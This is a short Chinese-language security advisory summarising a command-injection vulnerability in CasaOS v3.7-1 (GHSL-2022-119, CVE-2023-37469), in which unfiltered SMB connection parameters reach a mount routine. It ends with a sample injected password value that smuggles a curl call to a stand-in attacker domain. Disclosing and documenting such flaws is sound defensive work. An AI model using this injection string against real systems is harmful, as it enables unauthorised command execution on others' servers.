# GHSL-2022-119: CasaOS中的任意命令执行漏洞 - CVE-2023-37469

## 漏洞概述

在CasaOS的一个漏洞中，经过身份验证的用户可以连接到特定的SMB服务器，并执行任意命令。

### 受影响的版本

- CasaOS 版本: v3.7-1

### 漏洞详情

1. **漏洞位置**：
   - `PostSambaConnectionsCreate`函数调用了`MountSmaba`，在这个过程中，没有对输入进行过滤。
   
2. **问题根源**：
   - 在认证SMB分享时，如果恶意参数在SMB端有效，就会导致命令注入。

### 命令注入实例

攻击者可以在密码参数中添加恶意命令。例如，使用如下命令可以调用攻击者的域：

```bash
;CMD=$'\x20attackerdomain.com';curl$CMD
```
